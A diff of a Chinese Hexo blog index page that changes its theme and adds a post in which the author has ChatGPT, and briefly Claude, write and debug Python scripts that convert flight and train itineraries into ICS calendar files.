@@ -1,761 +1,1351 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fco.jpg">
-  <link rel="icon" href="/img/fco.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="m0ch4z">
-  <meta name="keywords" content="">
-  
-    <meta property="og:type" content="website">
-<meta property="og:title" content="m0ch4z&#39;blog">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"suiyideali.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Geek小黑板">
 <meta property="og:url" content="https://suiyideali.github.io/page/4/index.html">
-<meta property="og:site_name" content="m0ch4z&#39;blog">
+<meta property="og:site_name" content="Geek小黑板">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="m0ch4z">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  
-  <title>m0ch4z&#39;blog</title>
+<meta name="twitter:card" content="summary">
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+<link rel="canonical" href="https://suiyideali.github.io/page/4/">
 
 
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
 
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  <title>Geek小黑板</title>
   
 
 
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"suiyideali.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b4f763bdabe2c39a3ce1baaa04190ab5","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6Tp7ZllCJ1Q5Hr5Qx7QEnZoQ-MdYXbMMI","app_key":"hbnuiPd47pTbO5y5VU7X4yj7","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-    <!-- Baidu Analytics -->
-    <script async>
-      if (!Fluid.ctx.dnt) {
-        var _hmt = _hmt || [];
-        (function() {
-          var hm = document.createElement("script");
-          hm.src = "https://hm.baidu.com/hm.js?b4f763bdabe2c39a3ce1baaa04190ab5";
-          var s = document.getElementsByTagName("script")[0];
-          s.parentNode.insertBefore(hm, s);
-        })();
-      }
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-<body>
-  
+</head>
 
-  <header>
-    
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-<div class="header-inner" style="height: 100vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>m0ch4z&#39;blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于我</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Geek小黑板</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/suiyideali" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
   
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/">
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/Background.jpg') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-            <span id="subtitle" data-typed-text="Life is endless, tossing is endless"></span>
+            <a href="/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/" class="post-title-link" itemprop="url">让Chatgpt帮我写代码(一)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-22 22:40:52" itemprop="dateCreated datePublished" datetime="2023-04-22T22:40:52+08:00">2023-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-23 13:57:46" itemprop="dateModified" datetime="2023-04-23T13:57:46+08:00">2023-04-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
+                </span>
+            </span>
+
           
+
         </div>
+      </header>
 
-        
-      </div>
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        <div class="scroll-down-bar">
-          <i class="iconfont icon-arrowdown"></i>
-        </div>
+          <h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>今天在刷牙的时候看了一眼携程app上订的旅游的航班和高铁班次，发现不知什么时候携程把行程同步到日历的功能给下线了… </p>
+<p>但对于我这种习惯了用日历或者提醒功能的人，行程没法通过日历主动提醒，就觉得缺了啥东西。 于是上网搜了搜如何把行程同步到日历上。</p>
+<p>后来在知乎上看到了一个人把航班信息发给chatgpt，让它给我直接生成ics文件，然后用mac直接打开就能生成日历了。我也试了下，如下</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225021493.png" alt="chatgpt将航班信息转化为ICS文件格式"></p>
+<p>打开日历确实能够实现想要的效果，同样的手机上也正常显示。</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225145244.png" alt="日历显示"></p>
+<p>既然如此，那就可以直接让chatgpt帮我用写个脚本，下次直接填行程就行。 说干就干。</p>
+<h2 id="二、Chatgpt上场"><a href="#二、Chatgpt上场" class="headerlink" title="二、Chatgpt上场"></a>二、Chatgpt上场</h2><h3 id="2-1-航班信息"><a href="#2-1-航班信息" class="headerlink" title="2.1 航班信息"></a>2.1 航班信息</h3><p>我先重复了让它帮我生成ics的操作，然后再说出我的需求</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225543534.png" alt="将需求告诉它"></p>
+<p>然后将代码放入代码编辑器中运行，果不其然报错了</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225728727.png" alt="代码报错"></p>
+<p>直接丢给chatgpt，让它给我优化（我懒）</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225909046.png" alt="chatgpt给的排错建议"></p>
+<p>不出意外的已经把错误打印出来了</p>
+<p>ValueError: time data ‘2023&#x2F;05&#x2F;041 5:20’ does not match format ‘%Y&#x2F;%m&#x2F;%d %H:%M’</p>
+<p>这个错误提示表明时间格式不符合预期，可能是时间字符串中有一个多余的字符或者缺少一个字符。</p>
+<p>原来是为填写时间时候，出错了，把2023&#x2F;05&#x2F;04 15:20 写成 2023&#x2F;05&#x2F;041 5:20 了。</p>
+<p>最后查看result.ics打开验证是否能被日历功能正常读取。</p>
+<p>生成的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_flight_to_ics</span>(<span class="params">flight_info</span>):</span><br><span class="line">    regex = <span class="string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(regex, flight_info)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: failed to match flight information.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    airline, dep_airport, dep_time, arr_airport, arr_time = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成ICS字符串</span></span><br><span class="line">    start_time = datetime.strptime(dep_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    end_time = datetime.strptime(arr_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    uid = <span class="string">f&#x27;<span class="subst">&#123;airline&#125;</span>-<span class="subst">&#123;start_time.date()&#125;</span>&#x27;</span></span><br><span class="line">    ics_str = <span class="string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Flight Schedule//EN\nBEGIN:VEVENT\nUID:<span class="subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="subst">&#123;datetime.utcnow().strftime(<span class="string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="subst">&#123;start_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="subst">&#123;end_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:航班 <span class="subst">&#123;airline&#125;</span>\nLOCATION:<span class="subst">&#123;dep_airport&#125;</span>\nDESCRIPTION:<span class="subst">&#123;airline&#125;</span> 将于<span class="subst">&#123;dep_time&#125;</span>从<span class="subst">&#123;dep_airport&#125;</span>出发，预计于<span class="subst">&#123;arr_time&#125;</span>到达<span class="subst">&#123;arr_airport&#125;</span>。\nEND:VEVENT\nEND:VCALENDAR&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ics_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取航班信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Flight.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flight_info = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为ICS字符串</span></span><br><span class="line">ics_str = convert_flight_to_ics(flight_info)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ICS字符串写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.ics&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ics_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-高铁信息"><a href="#2-2-高铁信息" class="headerlink" title="2.2 高铁信息"></a>2.2 高铁信息</h3><p>现在解决了航班信息，突然想到还有高铁信息也需要，本次目的是chatgpt帮我写代码，所以我将上面的代码发送给他，增加了需求</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422231858210.png" alt="新增需求"></p>
+<p>生成的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_ics</span>(<span class="params">travel_info</span>):</span><br><span class="line">    regex = <span class="string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span></span><br><span class="line">    train_regex = <span class="string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(regex, travel_info)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">match</span> = re.search(train_regex, travel_info)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: failed to match travel information.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        travel_type = <span class="string">&quot;高铁/动车&quot;</span></span><br><span class="line">        train_no, dep_station, dep_time, arr_station, arr_time = <span class="keyword">match</span>.groups()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        travel_type = <span class="string">&quot;航班&quot;</span></span><br><span class="line">        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成ICS字符串</span></span><br><span class="line">    start_time = datetime.strptime(dep_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    end_time = datetime.strptime(arr_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    uid = <span class="string">f&#x27;<span class="subst">&#123;travel_type&#125;</span>-<span class="subst">&#123;start_time.date()&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> travel_type == <span class="string">&quot;航班&quot;</span>:</span><br><span class="line">        summary = <span class="string">f&#x27;<span class="subst">&#123;airline&#125;</span> <span class="subst">&#123;uid&#125;</span>&#x27;</span></span><br><span class="line">        location = dep_airport</span><br><span class="line">        description = <span class="string">f&#x27;<span class="subst">&#123;airline&#125;</span> 将于<span class="subst">&#123;dep_time&#125;</span>从<span class="subst">&#123;dep_airport&#125;</span>出发，预计于<span class="subst">&#123;arr_time&#125;</span>到达<span class="subst">&#123;arr_airport&#125;</span>。&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> travel_type == <span class="string">&quot;高铁/动车&quot;</span>:</span><br><span class="line">        summary = <span class="string">f&#x27;<span class="subst">&#123;train_no&#125;</span> <span class="subst">&#123;uid&#125;</span>&#x27;</span></span><br><span class="line">        location = dep_station</span><br><span class="line">        description = <span class="string">f&#x27;<span class="subst">&#123;train_no&#125;</span> 将于<span class="subst">&#123;dep_time&#125;</span>从<span class="subst">&#123;dep_station&#125;</span>出发，预计于<span class="subst">&#123;arr_time&#125;</span>到达<span class="subst">&#123;arr_station&#125;</span>。&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unknown travel type.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ics_str = <span class="string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="subst">&#123;datetime.utcnow().strftime(<span class="string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="subst">&#123;start_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="subst">&#123;end_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="subst">&#123;summary&#125;</span>\nLOCATION:<span class="subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ics_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取行程信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Flight.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    travel_info = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为ICS字符串</span></span><br><span class="line">ics_str = convert_to_ics(travel_info)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ICS字符串写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.ics&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ics_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据代码最后生成的结果出了点小bug</p>
+<p>高铁信息最后在rusult.ics中为 UID:航班-2023-05-02，其中应为UID:高铁&#x2F;动车-2023-05-02</p>
+<p>将错误反馈给chatgpt，继续改～</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422235008815.png" alt="chagpt排错"></p>
+<p>原来是我Flight.txt中的“到达时间”写成了“达到时间”，我的锅！ 错怪了你 chatgpt。</p>
+<p>修改后，就能正常生成了。</p>
+<h2 id="三、-Claude"><a href="#三、-Claude" class="headerlink" title="三、 Claude"></a>三、 <strong>Claude</strong></h2><h3 id="3-1-航班信息"><a href="#3-1-航班信息" class="headerlink" title="3.1 航班信息"></a>3.1 航班信息</h3><p>顺便试试Claude的代码能力。 告知他的需求</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423000312217.png" alt="告知需求"></p>
+<p>最终生成的效果如下，未能识别</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001749390.png" alt="未能识别"></p>
+<p>将问题反馈给Claude</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001828794.png" alt="反馈排错"></p>
+<p>继续跟它对话，可以按照它的操作来，也可以直接告诉它，把修改后的代码发给你</p>
